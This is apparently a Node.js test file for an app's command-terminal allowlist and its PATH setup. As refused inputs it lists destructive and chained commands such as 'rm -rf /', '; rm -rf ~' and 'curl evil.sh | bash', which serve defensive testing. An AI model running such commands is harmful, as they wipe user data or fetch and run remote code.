// packages/engine/service/areas/terminals.js: the 'command' terminal kind (#147) — commandSpec builds the
// shell invocation for a command the app itself suggests (an install command, gh's billing scope
// hint); openTerminal refuses any other string and, under CRAFTORIO_SIMULATION_ONLY, opens a simulated
// (virtual) terminal instead of a real process (#783).
const test = require('node:test');
const assert = require('node:assert/strict');
const { installCommands } = require('../../domains/machine/install-commands');
const { SCOPE_HINT } = require('../../domains/usage/actions-usage');
const terminalsArea = require('../../service/areas/terminals');
const { makeService } = require('./helpers');

// commandSpec is a pure builder: a minimal ctx (ws.root, a no-op events/notify) is enough, the way
// the developer's own notes describe it.
function areaWith(ws) {
  return terminalsArea({ ws, events: { emit() {} }, notify() {} });
}

test('commandSpec: on Windows, runs the command through cmd.exe /s /k, keeping the shell open, in the workspace root', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  const spec = commandSpec(SCOPE_HINT, 'win32');
  assert.equal(spec.file, 'cmd.exe');
  assert.equal(spec.args, '/s /k "gh auth refresh -s user"');
  assert.equal(spec.cwd, 'C:/ws');
});

test('commandSpec: on Linux/macOS, runs the command then execs the login shell, keeping it open, in the workspace root', () => {
  const { commandSpec } = areaWith({ root: '/home/x/ws' });
  for (const platform of ['linux', 'darwin']) {
    const prevShell = process.env.SHELL;
    process.env.SHELL = '/bin/zsh';
    try {
      const spec = commandSpec(SCOPE_HINT, platform);
      assert.equal(spec.file, '/bin/zsh');
      assert.deepEqual(spec.args, ["-c", "gh auth refresh -s user; exec '/bin/zsh'"]);
      assert.equal(spec.cwd, '/home/x/ws');
    } finally {
      if (prevShell === undefined) delete process.env.SHELL; else process.env.SHELL = prevShell;
    }
  }
});

test('commandSpec: falls back to /bin/sh without a SHELL environment variable', () => {
  const { commandSpec } = areaWith({ root: '/home/x/ws' });
  const prevShell = process.env.SHELL;
  delete process.env.SHELL;
  try {
    const spec = commandSpec(SCOPE_HINT, 'linux');
    assert.equal(spec.file, '/bin/sh');
  } finally {
    if (prevShell !== undefined) process.env.SHELL = prevShell;
  }
});

test('commandSpec: falls back to the home folder when the workspace has no root yet', () => {
  const os = require('os');
  const { commandSpec } = areaWith({ root: '' });
  const spec = commandSpec(SCOPE_HINT, 'win32');
  assert.equal(spec.cwd, os.homedir());
});

test('commandSpec: every install command of every platform is accepted, and so is gh\'s scope hint', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const platform of ['win32', 'linux', 'darwin']) {
    for (const brew of [true, false]) {
      for (const cmd of Object.values(installCommands(platform, { brew })).filter(Boolean)) {
        assert.doesNotThrow(() => commandSpec(cmd, platform, { brew }), `${cmd} on ${platform}, brew ${brew}`);
      }
    }
  }
  assert.doesNotThrow(() => commandSpec(SCOPE_HINT, 'win32'));
});

test('commandSpec (#316): the allowlist follows the per-OS hints, so Homebrew\'s commands are refused on Linux but still run on a Mac with Homebrew', () => {
  const { commandSpec } = areaWith({ root: '/home/x/ws' });
  for (const cmd of ['brew install gh', 'brew install git', 'brew install glab']) {
    assert.throws(() => commandSpec(cmd, 'linux'), /Only the commands the app suggests can run in a command terminal\./);
    assert.doesNotThrow(() => commandSpec(cmd, 'darwin', { brew: true }));
  }
});

// #398 (acceptance tests, written before the code): the allowlist takes the same Homebrew-aware list
// as the hints. Contract: commandSpec(command, platform, { brew }), like installCommands(platform, { brew }).
test('commandSpec (#398): on a Mac without Homebrew, every brew command is refused', () => {
  const { commandSpec } = areaWith({ root: '/Users/x/ws' });
  for (const cmd of ['brew install gh', 'brew install git', 'brew install glab', 'brew install whisper-cpp']) {
    assert.throws(() => commandSpec(cmd, 'darwin', { brew: false }), /Only the commands the app suggests can run in a command terminal\./, cmd);
  }
});

test('commandSpec (#398): on a Mac without Homebrew, the fallback xcode-select --install (git) is accepted', () => {
  const { commandSpec } = areaWith({ root: '/Users/x/ws' });
  assert.doesNotThrow(() => commandSpec('xcode-select --install', 'darwin', { brew: false }));
});

test('commandSpec (#398): xcode-select --install is not suggested, so refused, on a Mac with Homebrew, on Linux and on Windows', () => {
  const { commandSpec } = areaWith({ root: '/Users/x/ws' });
  assert.throws(() => commandSpec('xcode-select --install', 'darwin', { brew: true }), /Only the commands the app suggests/);
  assert.throws(() => commandSpec('xcode-select --install', 'linux'), /Only the commands the app suggests/);
  assert.throws(() => commandSpec('xcode-select --install', 'win32'), /Only the commands the app suggests/);
});

test('commandSpec (#398): look-alikes are still refused on a Mac without Homebrew', () => {
  const { commandSpec } = areaWith({ root: '/Users/x/ws' });
  for (const bad of ['xcode-select --install; rm -rf ~', 'rm -rf /', 'xcode-select --reset']) {
    assert.throws(() => commandSpec(bad, 'darwin', { brew: false }), /Only the commands the app suggests/, bad);
  }
});

test('commandSpec: refuses any command the app did not suggest itself', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const bad of ['rm -rf /', '', `${SCOPE_HINT} && rm -rf /`, 'winget install --id GitHub.cli -e; curl evil.sh | bash']) {
    assert.throws(() => commandSpec(bad, 'win32'), /Only the commands the app suggests can run in a command terminal\./);
  }
});

test("term:open kind command: refuses a command the app doesn't suggest, before the simulation guard", async (t) => {
  const { api } = makeService(t);
  assert.throws(() => api['term:open']({ kind: 'command', command: 'rm -rf /' }), /Only the commands the app suggests can run in a command terminal\./);
});

// #783: under CRAFTORIO_SIMULATION_ONLY an allowed command opens a simulated (virtual) terminal, never
// a real process: the browser UI's ▶ can be checked end to end.
test('term:open kind command (#783): an allowed command opens a simulated terminal under CRAFTORIO_SIMULATION_ONLY, never a real process', async (t) => {
  const { api } = makeService(t);
  const opened = api['term:open']({ kind: 'command', command: SCOPE_HINT });
  assert.equal(typeof opened.id, 'string');
  assert.equal(opened.title, SCOPE_HINT);
  assert.equal(opened.pid, undefined, 'no real process');
});

// #319 (acceptance tests, written before the code): the Setup's Sign in buttons run each CLI's
// sign-in command in a command terminal. Contract: packages/engine/domains/machine/install-commands.js exports signInCommands()
// -> { claude, codex, grok, gh, glab } (codex 'codex login', grok 'grok login', gh 'gh auth login',
// glab 'glab auth login', claude a command starting with 'claude'), all on the allowlist.
test('signInCommands (#319): one sign-in command per CLI', () => {
  const { signInCommands } = require('../../domains/machine/install-commands');
  const cmds = signInCommands();
  assert.equal(cmds.codex, 'codex login');
  assert.equal(cmds.grok, 'grok login');
  assert.equal(cmds.gh, 'gh auth login');
  assert.equal(cmds.glab, 'glab auth login');
  assert.equal(typeof cmds.claude, 'string');
  assert.match(cmds.claude, /^claude\b/);
});

test('commandSpec (#319): every sign-in command is accepted on every platform', () => {
  const { signInCommands } = require('../../domains/machine/install-commands');
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const platform of ['win32', 'linux', 'darwin']) {
    for (const [id, cmd] of Object.entries(signInCommands())) {
      assert.doesNotThrow(() => commandSpec(cmd, platform), `${id} on ${platform}`);
    }
  }
});

test('term:open kind command (#319, #783): a sign-in command passes the allowlist and opens a simulated terminal under simulation', async (t) => {
  const { signInCommands } = require('../../domains/machine/install-commands');
  const { api } = makeService(t);
  for (const cmd of Object.values(signInCommands())) {
    const opened = api['term:open']({ kind: 'command', command: cmd });
    assert.equal(opened.pid, undefined, `${cmd}: no real process`);
  }
});

test('commandSpec (#319): look-alikes of the sign-in commands are refused', () => {
  const { signInCommands } = require('../../domains/machine/install-commands');
  assert.equal(typeof signInCommands, 'function', 'signInCommands exists');
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const bad of ['gh auth logout', 'codex login --with-api-key', 'claude -p hello', 'glab auth login; rm -rf ~']) {
    assert.throws(() => commandSpec(bad, 'win32'), /Only the commands the app suggests can run in a command terminal\./, bad);
  }
});

// #397 (acceptance tests, written before the code): a command terminal's PATH has the folders the
// CLI lookup searches beyond PATH (macOS/Linux: ~/.local/bin, ~/.grok/bin, ~/.npm-global/bin...;
// Windows: ~\.local\bin, %APPDATA%\npm), only those that exist, read again on every launch, after
// the user's own PATH and without duplicates. The home folder is injected through HOME/USERPROFILE
// (os.homedir()) and APPDATA, the platform through commandSpec's argument.
const fs = require('fs');
const os = require('os');
const path = require('path');

// The PATH of a spawn env (a plain object: on Windows its key may be `Path`); exactly one such key.
function pathEntries(env) {
  const keys = Object.keys(env).filter((k) => k.toUpperCase() === 'PATH');
  assert.equal(keys.length, 1, `one PATH key in the env, got ${JSON.stringify(keys)}`);
  return String(env[keys[0]]).split(path.delimiter).filter(Boolean);
}

// A scratch home and a PATH made of one empty folder; restores the environment afterwards.
function isolatedHome(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cli-path-397-'));
  const home = path.join(dir, 'home');
  const own = path.join(dir, 'own-bin');
  fs.mkdirSync(home);
  fs.mkdirSync(own);
  const saved = {};
  for (const k of ['HOME', 'USERPROFILE', 'APPDATA', 'PATH', 'SHELL']) saved[k] = process.env[k];
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  process.env.APPDATA = path.join(home, 'AppData', 'Roaming');
  process.env.PATH = own;
  process.env.SHELL = '/bin/sh';
  t.after(() => {
    for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
    fs.rmSync(dir, { recursive: true, force: true });
  });
  return { home, own, localBin: path.join(home, '.local', 'bin') };
}

const userPath = () => String(process.env.PATH || '').split(path.delimiter).filter(Boolean);
const count = (list, p, win) => list.filter((x) => (win ? x.toLowerCase() === p.toLowerCase() : x === p)).length;

for (const platform of ['darwin', 'linux', 'win32']) {
  test(`commandSpec (#397, ${platform}): the terminal's PATH has ~/.local/bin when the CLI lives only there, after the user's own PATH`, (t) => {
    const { localBin } = isolatedHome(t);
    fs.mkdirSync(localBin, { recursive: true });
    fs.writeFileSync(path.join(localBin, platform === 'win32' ? 'claude.exe' : 'claude'), '');
    const { commandSpec } = areaWith({ root: os.tmpdir() });
    const entries = pathEntries(commandSpec('claude /login', platform).env);
    const own = userPath();
    assert.deepEqual(entries.slice(0, own.length), own, 'the user\'s PATH stays first, in its order');
    assert.equal(count(entries, localBin, platform === 'win32'), 1, `~/.local/bin once on PATH: ${entries.join(path.delimiter)}`);
  });

  test(`commandSpec (#397, ${platform}): a folder created after the first terminal (Install, then Sign in) is on the next terminal's PATH`, (t) => {
    const { localBin } = isolatedHome(t);
    const { commandSpec } = areaWith({ root: os.tmpdir() });
    const before = pathEntries(commandSpec('claude /login', platform).env);
    assert.equal(count(before, localBin, platform === 'win32'), 0, 'a folder that does not exist is not added');
    fs.mkdirSync(localBin, { recursive: true });
    const after = pathEntries(commandSpec('claude /login', platform).env);
    assert.equal(count(after, localBin, platform === 'win32'), 1, `~/.local/bin added once it exists: ${after.join(path.delimiter)}`);
  });

  test(`commandSpec (#397, ${platform}): a folder already on the user's PATH is not added twice, and the PATH keeps its order`, (t) => {
    const { own, localBin } = isolatedHome(t);
    fs.mkdirSync(localBin, { recursive: true });
    process.env.PATH = [own, localBin].join(path.delimiter);
    const { commandSpec } = areaWith({ root: os.tmpdir() });
    const entries = pathEntries(commandSpec(SCOPE_HINT, platform).env);
    const mine = userPath();
    assert.deepEqual(entries.slice(0, mine.length), mine);
    assert.equal(count(entries, localBin, platform === 'win32'), 1);
    assert.equal(new Set(platform === 'win32' ? entries.map((e) => e.toLowerCase()) : entries).size, entries.length, `no duplicates: ${entries.join(path.delimiter)}`);
  });
}

test('commandSpec (#397, darwin/linux): ~/.grok/bin and ~/.npm-global/bin (other CLIs detection finds) are on the terminal\'s PATH too', (t) => {
  const { home } = isolatedHome(t);
  const grok = path.join(home, '.grok', 'bin');
  const npmGlobal = path.join(home, '.npm-global', 'bin');
  fs.mkdirSync(grok, { recursive: true });
  fs.mkdirSync(npmGlobal, { recursive: true });
  const { commandSpec } = areaWith({ root: os.tmpdir() });
  for (const platform of ['darwin', 'linux']) {
    const entries = pathEntries(commandSpec('grok login', platform).env);
    assert.equal(count(entries, grok), 1, `${platform}: ${entries.join(path.delimiter)}`);
    assert.equal(count(entries, npmGlobal), 1, `${platform}: ${entries.join(path.delimiter)}`);
  }
});

test('commandSpec (#397, win32): %APPDATA%\\npm (npm-installed CLIs) is on the terminal\'s PATH, and a case variant of a PATH folder is not added again', (t) => {
  const { own, localBin } = isolatedHome(t);
  const npmDir = path.join(process.env.APPDATA, 'npm');
  fs.mkdirSync(npmDir, { recursive: true });
  fs.mkdirSync(localBin, { recursive: true });
  process.env.PATH = [own, localBin.toUpperCase()].join(path.delimiter);
  const { commandSpec } = areaWith({ root: os.tmpdir() });
  const entries = pathEntries(commandSpec('codex login', 'win32').env);
  assert.equal(count(entries, npmDir, true), 1, entries.join(path.delimiter));
  assert.equal(count(entries, localBin, true), 1, entries.join(path.delimiter));
});

test('commandSpec (#397): the shell left open after the command gets the same env (one env for the whole terminal)', (t) => {
  const { localBin } = isolatedHome(t);
  fs.mkdirSync(localBin, { recursive: true });
  const { commandSpec } = areaWith({ root: os.tmpdir() });
  const spec = commandSpec('claude /login', 'darwin');
  assert.deepEqual(spec.args, ['-c', "claude /login; exec '/bin/sh'"]);
  assert.equal(count(pathEntries(spec.env), localBin), 1);
});

test('cliEnv (#397): the env of every CLI or shell the app starts has the lookup\'s extra folders that exist, after the user\'s PATH', (t) => {
  const { localBin } = isolatedHome(t);
  const { cliEnv } = require('../../service/common');
  const win = process.platform === 'win32';
  assert.equal(count(pathEntries(cliEnv()), localBin, win), 0, 'not added before it exists');
  fs.mkdirSync(localBin, { recursive: true });
  const entries = pathEntries(cliEnv());
  const mine = userPath();
  assert.deepEqual(entries.slice(0, mine.length), mine);
  assert.equal(count(entries, localBin, win), 1, entries.join(path.delimiter));
});
